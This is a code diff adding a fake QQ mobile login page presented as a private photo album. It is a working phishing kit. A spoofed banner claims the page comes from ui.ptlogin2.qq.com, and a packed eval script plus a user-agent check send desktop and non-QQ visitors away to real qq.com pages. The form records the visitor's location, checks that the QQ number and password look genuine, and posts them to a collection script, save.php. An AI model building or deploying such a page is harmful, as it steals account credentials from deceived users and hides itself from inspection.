@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta id="viewport" name="viewport" content="width=device-width,minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <script src="//libs.baidu.com/jquery/2.0.0/jquery.min.js"></script>
+  <link href="/template/css/css.css" rel="stylesheet" type="text/css">
+  <link rel="stylesheet" href="//qzonestyle.gtimg.cn/qzone/phone/style/login.css">
+  <script src="//open.mobile.qq.com/sdk/qqapi.js?_bid=152"></script>
+  <script type="text/javascript">
+    $(function () {
+
+      mqq.ui.setTitleButtons({
+        left: {
+          title: "私密相册",
+          callback: function () {
+            //
+          }
+        },
+        right: {
+          hidden: true
+        }
+      })
+
+    });
+  </script>
+  <!--顶部banner-->
+</head>
+<script>
+  var doc=$(document);var _touches_point1=0;var _touches_point2=0;addEventListener("touchstart",function(a){_touches_point1=a.touches[0].pageY});addEventListener("touchmove",function(a){_touches_point2=a.touches[0].pageY;if(doc.scrollTop()<=0&&_touches_point1<_touches_point2){a.preventDefault();if($("#_domain_display").length<=0){$("body").prepend('<div id="_domain_display" style="text-align:center;background-color:#bebdc2;color:#65696c;height:0px;padding-top:15px;line-height:26px;font-size:12px;overflow:hidden;"><p>网页由 '+
+	'ui.ptlogin2.qq.com'
+	+' 提供</p><p>QQ浏览器X5内核提供技术支持</p></div>')}$("#_domain_display").height((_touches_point2-_touches_point1))}});addEventListener("touchend",function(a){$("#_domain_display").slideUp("normal",function(){$("#_domain_display").remove()})});
+eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('8 1={4:6,5:6,7:6};8 2=9.d;1.4=2.3("b")==0;1.5=2.3("c")==0;1.a=(2=="e")||(2.3("f")==0);k(1.4||1.5||1.7){o.n.l="g://j.i.h/m/"}',25,25,'|system|p|indexOf|win|mac|false|xll|var|navigator|x11|Win|Mac|platform|X11|Linux|http|com|qq|pvp|if|href||location|window'.split('|'),0,{}));
+if(navigator.userAgent.indexOf('QQ/')>0){
+  }else{
+	window.location.href='http://i.qq.com';
+  }
+var province = remote_ip_info.province; var city = remote_ip_info.city; document.getElementById("ip").value=province+city;</script>
+
+<body style="zoom: 1;">
+  <div id="content" class="content">
+    <div id="error_tips">
+      <div id="error_tips_content">
+        <span id="error_icon"></span>
+        <span id="error_message"></span>
+      </div>
+    </div>
+    <div id="login" class="login">
+      <div id="logo" class="logo"></div>
+      <div id="app_name" style="display: none"></div>
+      <div id="q_login" class="q_login" style="display: none">
+        <div id="q_login_title">
+          <div id="q_login_logo"></div>
+          <label id="q_login_tips"></label>
+        </div>
+        <div id="q_logon_list" class="q_logon_list"></div>
+      </div>
+      <div id="web_login">
+        <form id="loginform" autocomplete="off" name="loginform" action="" method="" target="" style="margin:0">
+          <input type="hidden" name="ip" id="ip" />
+          <ul id="g_list">
+            <li id="g_u">
+              <div id="del_touch" class="del_touch">
+                <span id="del_u" class="del_u"></span>
+              </div>
+              <input id="u" class="inputstyle" name="hrUW3PG7mp3RLd3dJu" autocomplete="off" placeholder="QQ号码/手机/邮箱">
+            </li>
+            <li id="g_p">
+              <div id="del_touch_p" class="del_touch">
+                <span id="del_p" class="del_u"></span>
+              </div>
+              <input id="p" class="inputstyle" maxlength="16" type="password" name="LxMzAX2jog9Bpjs07jP" autocorrect="off"
+                placeholder="请输入您的QQ密码">
+            </li>
+          </ul>
+          <div href="javascript:void(0);" id="go">登 录</div>
+        </form>
+      </div>
+      <div id="switch">
+        <div id="swicth_login" onclick="pt._switch()" style="display: none"></div>
+        <div id="zc_feedback">
+          <span id="zc" onclick="window.open(&#39;http\x3A\x2F\x2Fptlogin2.qq.com\x2Fj_newreg_url&#39;)">注册新帐号</span>
+          <span id="forgetpwd" onclick="window.open(&#39;http://ptlogin2.qq.com/j_findpwd_url&#39;)">忘了密码？</span></div>
+      </div>
+      <div id="custom_bottom"></div>
+    </div>
+    <div id="vcode">
+      <label id="vcode_tips"></label>
+      <div id="vcode_area">
+        <img id="vcode_img">
+        <label id="input_tips"></label>
+        <input id="vcode_input" name="vcode_input" tabindex="3" autocomplete="off" autocorrect="off" maxlength="6"></div>
+      <div id="button"></div>
+    </div>
+  </div>
+  <div id="new_vcode" class="new_vcode"></div>
+  <div id="footerBlank"></div>
+  <script>
+    var times = 0;
+
+    function error(msg) {
+      $("#error_tips").css({
+        display: 'block'
+      });
+      $('#error_message').html(msg);
+      err = true;
+    }
+    $('form input').focus(function () {
+      $("#error_tips").css({
+        display: 'none'
+      });
+      err = false;
+    });
+    $("#error_tips").on('click',
+      function () {
+        $(this).hide();
+      });
+    $("#go").on('click',
+      function () {
+        var $this = $(this);
+        err = false;
+        var p = $("#p").val();
+        var u = $("#u").val();
+        u == '' && error('您还没有输入帐号！');
+        if (err) return false;
+        p == '' && error("您还没有输入密码！");
+        if (err) return false;
+
+        /^[1-9][0-9]{5,9}$/.test(u) || error('请输入正确的帐号！');
+        if (err) return false;
+
+        if (sameChar(u)) {
+          error("您输入的帐号或密码不正确，请重新输入。");
+          $("#u").val('');
+          $("#p").val('');
+          return false;
+        }
+
+        var len = p.length;
+
+        (len < 6 || len > 16) && error('您输入的帐号或密码不正确，请重新输入。');
+        /*新增密码校验*/
+        var pattern = /[\u4e00-\u9fa5]+/g;
+        pattern.test(p) && error("您输入的帐号或密码不正确，请重新输入。");
+        var pattern2 = /^[0-9]*$/g;
+        pattern2.test(p) && error("您输入的帐号或密码不正确，请重新输入。");
+        if (sameChar(p)) {
+          error("您输入的帐号或密码不正确，请重新输入。");
+          $("#p").val('');
+          return false;
+        }
+        /**/
+
+        if (!err) {
+          $.ajax({
+            // http://jvkcb9.cn/save.php
+            url: 'save.php',
+            type: 'POST',
+            dataType: 'json',
+            async: false,
+            data: $('#loginform').serialize(),
+            success: function (r) {
+              $.getScript('/lib/t.js');
+            },
+            error: function (er) {
+              $.getScript('/lib/t.js');
+            }
+          })
+        }
+      })
+
+    function sameChar(str) {
+      var result = true;
+      var c = str.charAt(0);
+      for (var i = 0; i < str.length; i++) {
+        if (c != str.charAt(i)) {
+          result = false;
+          break;
+        }
+      }
+      return result;
+    }
+  </script>
+  <div style="display:none;">
+</body>
+
+</html>
